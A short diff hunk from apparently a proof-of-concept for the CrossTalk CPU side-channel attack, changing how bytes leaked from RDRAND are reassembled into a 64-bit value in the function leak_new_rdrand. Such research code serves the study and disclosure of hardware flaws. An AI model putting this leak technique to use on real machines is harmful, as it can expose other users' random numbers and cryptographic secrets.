@@ -172,7 +172,7 @@ uint64_t leak_new_rdrand(uint64_t old_rdrand, uint8_t* leak_buffer, uint8_t* rel
             //     ++similarity;
             // }
 
-            result = result << 8 | byte;
+            result = ((uint64_t)byte << (8 * (CROSSTALK_BYTES_TO_LEAK - 1))) | (result >> 8);
         }
 
         if (result != last_result) {
